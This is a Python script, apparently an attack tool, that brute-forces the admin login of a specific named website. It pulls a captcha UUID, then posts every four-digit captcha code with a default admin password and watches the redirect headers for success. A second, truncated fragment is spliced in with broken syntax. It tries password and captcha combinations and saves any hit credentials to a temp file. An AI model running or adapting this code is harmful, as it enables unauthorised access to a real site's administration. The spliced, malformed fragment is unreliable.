import subprocess, json, sys

# Get captcha UUID and session
r = subprocess.run(["curl","-sk","https://api.myxypt.com/captcha?width=140&height=48"],
    capture_output=True, text=True, timeout=10)
uuid = json.loads(r.stdout)["data"]["uuid"]
subprocess.run(["curl","-sk","-c","/tmp/cn_sess.txt",
    "http://chinanaisi.com/admin/login","-o","/dev/null"], timeout=5)
print("UUID:", uuid)

# Try all 10000 codes with single password
for i in range(10000):
    code = "%04d" % i
    try:
        r = subprocess.run(["curl","-sk","--connect-timeout","3","--max-time","5",
            "-b","/tmp/cn_sess.txt",
            "http://chinanaisi.com/admin/login.php","-X","POST",
            "-d","action=loginpost&uuid=%s&loginId=&username=admin&password=admin123&checkcode=%s" % (uuid, code),
            "-H","X-Requested-With: XMLHttpRequest",
            "-A","Mozilla/5.0","-D","-","-o","/dev/null"],
            capture_output=True, text=True, timeout=7)
    except:
        continue
    
    loc = [l for l in r.stdout.split("\n") if "Location:" in l]
    if not loc or "/admin/login.php" not in str(loc):
        print(">>> HIT: code=%s <<<" % code)
        sys.exit(0)
    
    if i % 500 == 0:
        print("%s/10000" % code)

print("All 10000 tried, no hit for admin123")
-X','POST',
                '-d',f'action=loginpost&uuid={uid}&loginId=&username=admin&password={pw}&checkcode={cv}',
                '-b','/tmp/cf2.txt'],capture_output=True,text=True,timeout=6)
            if '\u767b\u5f55' not in r3.stdout:
                print(f'PASSWORD=*** stdout[:100]}',flush=True)
                open('/tmp/CF_HIT.txt','w').write(f'user=admin pass={pw} code={cv} uid={uid}\n{r3.stdout[:1000]}')
                break
        except: pass
print('DONE',flush=True)
